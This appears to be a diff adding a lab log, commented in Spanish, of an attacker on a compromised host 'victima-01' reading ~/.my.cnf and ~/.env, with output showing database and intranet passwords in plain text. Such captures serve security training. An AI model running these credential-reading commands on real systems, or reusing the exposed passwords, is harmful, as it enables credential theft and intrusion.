@@ -1,0 +1,35 @@
+# 2026-11-27 18:55:41 UTC · 4 s · desde victima-01 (comprometida)
+# El atacante, ya dentro de victima-01, busca credenciales en el home
+$ ls -la ~; echo; echo '--- ~/.my.cnf'; cat ~/.my.cnf; echo '--- ~/.env'; cat ~/.env
+
+total 48
+drwx------ 3 lab  lab  4096 Nov 27 19:48 .
+drwxr-xr-x 3 root root 4096 Nov 19 14:35 ..
+-rw-r--r-- 1 lab  lab   220 Nov 19 14:35 .bash_logout
+-rw-r--r-- 1 lab  lab  3526 Nov 19 14:35 .bashrc
+-rw------- 1 lab  lab   324 Nov 27 19:48 db_backup.sql
+-rw------- 1 lab  lab   205 Nov 27 19:48 .env
+-rw-r--r-- 1 lab  lab  5290 Nov 19 14:35 .face
+lrwxrwxrwx 1 lab  lab     5 Nov 19 14:35 .face.icon -> .face
+drwx------ 3 lab  lab  4096 Nov 19 14:52 .local
+-rw------- 1 lab  lab    73 Nov 27 19:48 .my.cnf
+-rw------- 1 lab  lab   211 Nov 27 19:48 notas_acceso.txt
+-rw-r--r-- 1 lab  lab   807 Nov 19 14:35 .profile
+-rw-r--r-- 1 lab  lab     0 Nov 19 14:58 .sudo_as_admin_successful
+
+--- ~/.my.cnf
+[client]
+host=10.0.0.50
+port=3306
+user=app_svc
+password=uL6afPqDJTtrbMdu
+--- ~/.env
+APP_ENV=production
+DB_HOST=10.0.0.50
+DB_PORT=3306
+DB_NAME=app
+DB_USER=app_svc
+DB_PASSWORD=uL6afPqDJTtrbMdu
+INTRANET_URL=http://10.0.0.50:80/
+INTRANET_USER=intranet_admin
+INTRANET_PASSWORD=7UkXE8Wpk2ybB3TR
